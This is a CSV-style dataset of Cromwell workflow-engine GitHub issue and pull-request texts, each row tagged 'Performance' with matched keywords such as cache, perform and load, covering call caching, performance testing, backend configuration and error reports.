Performance,"Addresses [WX-1306](https://broadworkbench.atlassian.net/browse/WX-1306), [WX-1307](https://broadworkbench.atlassian.net/browse/WX-1307), [WX-1308](https://broadworkbench.atlassian.net/browse/WX-1308), [WX-983](https://broadworkbench.atlassian.net/browse/WX-983). PR creates a GHA (currently runs on dispatch, can be updated to run on schedule of choice) that creates a billing project and BEE, attaches the BEE to a static landing zone, creates a workspace and provisions an app within the BEE, submits a workflow (basic hello world) to Cromwell, and performs app/workspace/billing project cleanup afterwards. BEE template is flagged by Janitor for post workflow cleanup to ensure no lingering resources. Workspace deletion and billing project deletion are finicky due to invariable timing of the deletion itself (can be either extremely short or longer than 12 minutes), so those two steps are handled by either an exception block (workspace deletion) or `continue-on-error` (billing project) to ensure that failures there do not reflect a failure on the test against Cromwell. Workspace provisioning and app creation are necessary for running tests against Cromwell, so a failure there will be reported as a failure on the Cromwell test. (As an aside, this could be rectified by having a static testing app that's always running in a dedicated testing environment. Test could be updated to run submissions against it so as long as that app is kept up to date. [WX-1306]: https://broadworkbench.atlassian.net/browse/WX-1306?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ; [WX-1307]: https://broadworkbench.atlassian.net/browse/WX-1307?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ; [WX-1308]: https://broadworkbench.atlassian.net/browse/WX-1308?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ; [WX-983]: https://broadworkbench.atlassian.net/browse/WX-983?atlOri",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7236:552,perform,performs,552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7236,1,['perform'],['performs']
Performance,Adds a meta attribute that allows people to mark tasks as non-call-cacheable. Note: Marking as a community contribution since this was an out-of-hours project.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5426:67,cache,cacheable,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5426,1,['cache'],['cacheable']
Performance,Adds endpoint support for; - logs; - outputs; - call cache diffs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2474:53,cache,cache,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2474,1,['cache'],['cache']
Performance,Adds in supported backend for Google cloud batch. This is an initial commit to start code review and perform integration tests.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7125:101,perform,perform,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7125,1,['perform'],['perform']
Performance,Adjust database settings for improved performance,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1582:38,perform,performance,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1582,1,['perform'],['performance']
Performance,"After deep-diving into the QA perf environment, I think we could get some continuous-testing value very quickly by doing the following:. - Copy their `project-deploy` [(link)](https://fc-jenkins.dsp-techops.broadinstitute.org/job/project-deploy/) job over to deploy our `develop` image to our own perf environment every night; - Or: do something more custom since we don't need all the general-purpose non-Cromwell stuff; - Copy their `perf-run-single-test-until-it-fails` [(link)](https://fc-jenkins.dsp-techops.broadinstitute.org/view/Perf/job/perf-run-single-test-until-it-fails/) job and make it run against our own environment every night. Even something this simple would (maybe after they check our working a few times?) allow us to remove the ""wait for QA"" portion of the release process since we'd be able to look-up the results rather than regenerating them. We'd also be able to track performance over time and have a better idea of how much signal-to-noise there is in the tests (eg how much variation is within normal bounds?).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4980:896,perform,performance,896,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4980,1,['perform'],['performance']
Performance,"After discussion, we will resurrect the config named [`backend.backendsAllowed`](https://github.com/broadinstitute/cromwell/commit/9faa735df0039652b124ecc0b7e7e5ffa62fd0ff#diff-29d3e359e75a05cf433ad3abe5f194a8L85), [`backend.allowedBackends`](https://github.com/broadinstitute/cromwell/commit/9faa735df0039652b124ecc0b7e7e5ffa62fd0ff#diff-59ba4e6691e949675b4ccaa65a906e1dL22), or maybe just `backend.allowed` to match the style of the config named `backend.default`. Whatever the name, only backends found in this explicit list will be loaded. By default, the reference list will only contain ""Local"". Thus, after upgrading, cromwell will default back to running _only_ the Local backend, until admins/users re-enable the other backends by overriding the list.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-288155798:536,load,loaded,536,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-288155798,1,['load'],['loaded']
Performance,"After much discussion and clarification (thanks @geoffjentry ), these are the 2 use cases relating to Deleting and Cleaning up files after running a workflow:; * Use case 1: I want to clean up intermediary files from my workflow, but keep all outputs. I understand that I will no longer be able to call cache on this workflow.; * Use case 2: I want to delete all files related to my workflow, I will never need it again. This includes outputs. I will not be able to call cache on this workflow. There are a few remaining questions to answer but we are getting closer. Thank you all for your input in the meantime.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329581495:303,cache,cache,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329581495,2,['cache'],['cache']
Performance,"After running a large workflow on GCS with ~2,500 tasks, rather than the workflow transitioning from running to success, I received the following error:; ```; ""status"": ""Failed"",; ""failures"": [; {; ""message"": ""Workflow is making no progress but has the following unstarted job keys: \nScatterCollectorKey_PortBasedGraphOutputNode_xxx.yyy:-1:1\nConditionalCollectorKey_PortBasedGraphOutputNode_xxx.yyy:-1:1"",; ""causedBy"": []; }; ],; ```. The `xxx.yyy` output variable is from a task being scattered and defined as follows:; ```; task xxx {; ...; output {; ...; File? yyy = if defined(zzz) then ... else None; }; }; ```; With `zzz` not defined. Despite the error, the job seemed to have completed successfully. However the files were not moved into the `final_workflow_outputs_dir` as they were supposed to, causing an unwelcome inconvenience. This [problem](https://support.terra.bio/hc/en-us/community/posts/360073398892-Workflow-failure-Workflow-is-making-no-progress-but-has-the-following-unstarted-job-keys-) has also been reported about six months ago in the Terra forum. The job run with CallCaching activated but no entries in the cache were present before the job started. The only event of notice was that at some point Cromwell crashed due to high memory demand (while trying to retrieve the metadata for the workflow) but, after I restarted it, the workflow proceeded without issues. The workflow is a `version development` WDL, as can be evinced from the use of the `None` keyword.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6238:1137,cache,cache,1137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6238,1,['cache'],['cache']
Performance,"Agree for the need for better docs. For now:; - This is from the call cache strategy stanza.; - What it's saying is that if you use hard-links to localize files for tasks then those paths to the localized files will not match the pre-localized paths and that can interfere with call caching (note that with soft-links, Cromwell can look up the fully-resolved original path).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-429072869:70,cache,cache,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-429072869,1,['cache'],['cache']
Performance,"Akka 2.5.4 provides the new [AffinityPool](https://github.com/akka/akka/pull/23104) which is expected to provide performance benefit in cases where you have long lived actors maintaining lots of state. Because it works a lot like a `PinnedDispatcher` it wouldn't be a panacea for us even if it was useful in some of our cases but I can imagine using it for a handful of carefully selected actors (and perhaps only specified in a handful of use cases for Cromwell) could have benefits. . This ticket is mostly a benchmarking exercise to explore what using this pool might do to performance in Cromwell. Try to hash out an envelope of where/if this pool would be useful. For instance, would adding it to a few key actors provide measurable impact? Does it depend on how many cores are in use altogether, i.e. does the pinning effect mean that you really need excess cpus to see benefit? etc etc etc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2571:113,perform,performance,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2571,2,['perform'],['performance']
Performance,"Akka HTTP is effectively the next version of Spray. Spray is for all intents and purposes a dead technology. Considering that's been the case for over a year now, we should update at some point just because eventually we'll run into a problem that won't be resolved by developers. Also, Akka HTTP is now hitting a point in its development cycle where not only is it deemed ""Better"" :tm: but they've switched to ease of use and performance and it's eclipsing Spray in those categories now as well. I've labeled this as developers choice as it certainly doesn't _need_ to happen any time soon, although if a someone wearing a PO hat thought it was otherwise important it could certainly be pushed in elsewhere (since it likely _would_ include performance enhancements and such)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1243:427,perform,performance,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1243,2,['perform'],['performance']
Performance,Allow non-call-cached tasks [BA-6282],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5426:15,cache,cached,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5426,1,['cache'],['cached']
Performance,"Alpha testing results. **Before:**. Mean = 6 failures, stdev = 10. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/978/ (32 total failed workflows, 1 hr 1 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/979/ (1 total failed workflows, 55 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/984/ (2 total failed workflows, 1 hr 5 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/988/ (15 total failed workflows, 1 hr 40 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:121,Perform,PerformanceTest-against-Alpha,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,7,['Perform'],['PerformanceTest-against-Alpha']
Performance,"Also @wleepang I was able to do a docker pull on the AMI that I am using:. AMI ID: amzn-ami-2018.03.h-amazon-ecs-optimized (ami-0a0c6574ce16ce87a). `[ec2-user@ip-172-31-29-236 ~]$ docker pull ubuntu:latest; latest: Pulling from library/ubuntu; 473ede7ed136: Pull complete; c46b5fa4d940: Pull complete; 93ae3df89c92: Pull complete; 6b1eed27cade: Pull complete; Digest: sha256:29934af957c53004d7fb6340139880d23fb1952505a15d69a03af0d1418878cb; Status: Downloaded newer image for ubuntu:latest`. Let me know if there is something off here, it seems fine to me",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4345#issuecomment-435913460:113,optimiz,optimized,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4345#issuecomment-435913460,1,['optimiz'],['optimized']
Performance,"Also, note that Google PD's can be expanded on the fly in seconds, even while the VM is still running under load. I've done this manually on non-FC VMs via the script below. Using this approach combined with a disk space monitoring process (and a size cap!) would allow the job to pass the first time, avoiding a retry. And... if it was also during the algorithm, not just data download, this could eradicate both disk space errors and disk over-provisioning. . https://github.com/broadinstitute/firecloud_developer_toolkit/blob/master/gce/expand_disk.sh. Unfortunately I don't know of a way to hot-swap RAM into the VM.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-325727902:108,load,load,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-325727902,1,['load'],['load']
Performance,"Also, please make sure wherever you specify the runtime-attributes; ""docker"", ""memory"" etc, you include ""disks"" also. Example:; ""default_runtime_attributes"": {; ""docker"": ""ubuntu:latest"",; ""memory"": ""21G"",; ""disks"" : ""/mnt/efs 3 EFS""; }; The size,3 , in this case does not matter. It gets ignored. On Fri, Feb 14, 2020 at 9:45 AM Vanaja Narayanaswamy <vanajasmy@gmail.com>; wrote:. > Can you upload the complete stack trace from the cromwell-log?; >; > On Fri, Feb 14, 2020 at 9:29 AM pjongeneel <notifications@github.com>; > wrote:; >; >> I have /mnt/efs on both batch nodes and cromwell server which is the; >> mounted EFS.; >>; >> Then; >> backend {; >> // this configures the AWS Batch Backend for Cromwell; >> default = ""AWSBATCH""; >> providers {; >> AWSBATCH {; >> actor-factory =; >> ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; >> config {; >> root = ""/mnt/efs/cromwell_execution""; >> auth = ""default""; >>; >> numSubmitAttempts = 3; >> numCreateDefinitionAttempts = 3; >>; >> default-runtime-attributes {; >> queueArn: ""${BatchQueue}""; >> }; >>; >> filesystems {; >> local { auth = ""default"" }; >> }; >> }; >> }; >>; >> }; >> }; >>; >> And I always get this error:; >> ERROR - AwsBatchAsyncBackendJobExecutionActor; >> [UUID(8512304b)bioinfx.testjob:NA:1]: Error attempting to Execute; >> java.util.NoSuchElementException: None.get; >>; >> —; >> You are receiving this because you were mentioned.; >> Reply to this email directly, view it on GitHub; >> <https://github.com/broadinstitute/cromwell/pull/5070?email_source=notifications&email_token=ALILATR2AVXQXLFRQKER6W3RC3IIXA5CNFSM4IBORPI2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGOELZZF7A#issuecomment-586388220>,; >> or unsubscribe; >> <https://github.com/notifications/unsubscribe-auth/ALILATWPGUN66MUEOCVPYULRC3IIXANCNFSM4IBORPIQ>; >> .; >>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586416147:1038,queue,queueArn,1038,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586416147,1,['queue'],['queueArn']
Performance,"An additional call caching metadatum that just says whether it was a hit or miss. The existing `Call caching read result` can stay as it is, or we could standardise the name a bit?. e.g. ; ```; ""cacheHit"": true; ""cacheResult"": ""Cache Hit: b324a594-6d46-47d1-b641-7a0dbf4b21c2:call_cache_capoeira_jes.make_files:-1""; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1994:195,cache,cacheHit,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1994,3,"['Cache', 'cache']","['Cache', 'cacheHit', 'cacheResult']"
Performance,"An audit of Cromwell traffic shows >96% of traffic hits the status endpoint for polling. A sample of this traffic shows an average of 40/s. As a perf benchmark we'd like to ensure that CromIAM can handle 200 reqs/s to this endpoint, ideally assuming SAM & Cromwell are perfectly performant.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4614:279,perform,performant,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4614,1,['perform'],['performant']
Performance,"An update...; It looks like the performance of `sync` — run on command line entirely outside the context of cromwell — that we see on our box that happens to be running cromwell is atypical. Other machines in our compute cluster with same OS and similar amounts of memory execute `sync` in milliseconds, the cromwell server box takes up to a second. we're still trying to identify the cause; there are some configuration differences in the machines, specifically the number, type and state of the mounted filesystems, as well as differences in the applications running in background, but as it stands I'm happy to call this as not a cromwell performance issue, so much as a potential performance issue running cromwell in certain environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-285258989:32,perform,performance,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-285258989,3,['perform'],['performance']
Performance,And I'll nominate @kshakir to review potentially concurrently,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/128#issuecomment-127389399:49,concurren,concurrently,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/128#issuecomment-127389399,1,['concurren'],['concurrently']
Performance,"And again on a new run, with something that looks very similar... ```; [ERROR] [05/01/2017 21:06:38.897] [cromwell-system-akka.dispatchers.engine-dispatcher-86] [akka.dispatch.Dispatcher] null; java.lang.NullPointerException; at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor.receiver(CallCacheWriteActor.scala:17); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:21); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:19); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:611,concurren,concurrent,611,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['concurren'],['concurrent']
Performance,And another possible bug: why are we trying to upload an auth file when running in application default auth mode for both genomics and filesystems?. ```; [ERROR] [01/27/2017 14:39:36.100] [cromwell-system-akka.dispatchers.engine-dispatcher-5] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow 732474fd-88b0-4a5e-ad19-5ee5cd71d141 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:81); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:80); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinP,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924:930,concurren,concurrent,930,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924,1,['concurren'],['concurrent']
Performance,"Another note to add that while i can't reproduce Yossi's error, he & I had previously identified `Scope.fullyQualifiedName` as a possible culprit. I decided to look at why MWDA is so much slower and that *is* being gated by the same function, to the tune of (at the time of this writing) 84.6% (and rising) of the total runtime so far.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277114329:250,tune,tune,250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277114329,1,['tune'],['tune']
Performance,"Any details I provide are only definitely true w/ the jes backend, haven't looked at others but I'm assuming they're similar. Also glob processing is backend-specific which leads to further problems I'll also address. Even if other backends aren't similar I think the same problems will manifest in other ways so there should still be similarity of solution. When a glob returns there's a FOFN on JES and that path is stored in a WdlGlobFile. In `JesAsyncBackendJobExecutionActor.postProcess` the function `evaluateOutputs` is called which effectively decomposes the `WdlGlobFile` into a `WdlArray[WdlSingleFile]` and then this array is carried around in memory in perpetuity (for the workflow). Much CPU and memory are spent for this conversion both at creation time and trying to stuff these things into the metadata service (see the very patriotic #1776). . I'm wondering if we could do something sneaky here and maintain the `WdlGlobFile` as-is and evaluate only what's necessary when necessary. Some thoughts as examples, some are contradictory I'm sure. - Allow that `Array[WdlFile]` to have both `WdlGlobFile` and `WdlSingleFile` with the former being dynamically expanded; - When we need the full list of files for downstream tasks perhaps we can stream them somehow instead of holding in memory; - In an example like a scatter/gather perhaps we could perform the collection on the glob files themselves via merging the stored glob file; - Perhaps we could *always* store an Array[WdlFile] as a FOFN on disk?; - Presumably we'll want to always expand to the full list of single files stored in the metadata for output reporting purposes. Could we stream the strings directly (and then remove) into the DB instead of all of the multiple boxings/unwrappings/etc?. Beyond ""this is all a bunch of work"" some issues that pop out:. - As stated not all backends might be handling globs the same. ; - What if Backend 1 generates a `WdlGlobFile` but that gets handed to Backend 2?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1777:1360,perform,perform,1360,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1777,1,['perform'],['perform']
Performance,"Are those ""queue in cromwell"" part of a subworkflow ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2216#issuecomment-298043978:11,queue,queue,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2216#issuecomment-298043978,1,['queue'],['queue']
Performance,"Are we using single inserts or batch inserts when writing to the DB? That can cause huge performance gains due the reduction in chatter. > On Dec 27, 2016, at 1:08 AM, Jeff Gentry <notifications@github.com> wrote:; > ; > While benchmarking some performance enhancements I've been playing with I kept noticing that no matter how fast I could get things eventually performance would drop back down to baseline levels from develop. I traced it down to the WriteMetadataActor, specifically it appears that writing boatloads of individual events (not atypical under load) can cause a lot of problems (not particularly surprising, but ...); > ; > It seems like some sort of batching/work pulling scheme could work wonders here although presumably it'd then come at the cost of memory (to buffer the unwritten values). That's just one thought, not a prescription; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub, or mute the thread.; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269315957:89,perform,performance,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269315957,4,"['load', 'perform']","['load', 'performance']"
Performance,"Are you positive? I'm seeing a `Compilation failed` near the end. If `compile` alone doesn't surface the issue, try `test:compile`. There is a very small chance this is caused by caching - or rather inadequate cache invalidation - so I cleared Travis's cache on this build and restarted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4977#issuecomment-493606960:210,cache,cache,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4977#issuecomment-493606960,4,['cache'],['cache']
Performance,"As FireCloud, I would like to enable call caching. Because this is a multi-tenant system, and Cromwell knows nothing about users, I may try to call cache to a call where I don't have permission to read the files. Currently (due to #1510) this would cause that cache hit to be ejected from the cache, and thus unavailable to users who do have the right file permissions. I would like to have a option in cromwell which would allow me to disable this invalidation step. When I attempt to call cache, and the cache hit fails due to a permission problem I simply attempt to cache using the next hit (if there are any). @abaumann -- please comment with any changes",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1587:148,cache,cache,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1587,6,['cache'],['cache']
Performance,"As I commented above, the tricky part is determining where to put this stuff such that it a) makes sense and b) people will remember it is there. I don't really care, I lean towards a private repo, but the real bottleneck at the time (as I remember asking in person as well) was getting people to opine, and no one did.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1296#issuecomment-315172239:211,bottleneck,bottleneck,211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1296#issuecomment-315172239,1,['bottleneck'],['bottleneck']
Performance,"As a **user running the same workflows repeatedly**, I want **Cromwell to hash the outputs of my workflows**, so that **I can safely call cache on my outputs and I don't have to worry if they changed**.; - effort: Small to medium ; - risk: Small ; - business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054:138,cache,cache,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054,1,['cache'],['cache']
Performance,"As a **user running workflows**, I want **Cromwell to split up its docker hashes by registry**, so that **if one registry is slow, that it doesn't affect the performance of the other registries**.; - Effort: Small to medium; - Risk: Small; - Business value: Small to medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399:158,perform,performance,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399,1,['perform'],['performance']
Performance,"As a **user running workflows**, I want **Cromwell to use a default job count limit if I have not configured a `concurrent-job-limit`**, so that **the backend defaults to a sensible job limit**.; * Effort: Small; * Risk: Small; * Business Value: Small to Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911:112,concurren,concurrent-job-limit,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911,1,['concurren'],['concurrent-job-limit']
Performance,"As a **user running workflows**, I want **to see fewer unhelpful log messages**, so that **performance improves and it is easier to find important messages**. More information and improvement ideas in the [Logging spec](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). - effort: Small to Medium; - risk: Small; - Currently we show too many log messages, which degrades performance. We risk showing too few, but I think it's a risk we can mitigate.; - business value: Medium ; - Our logs are where users go to debug workflows, and currently they are a haystack to pick through.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-344984674:91,perform,performance,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-344984674,2,['perform'],['performance']
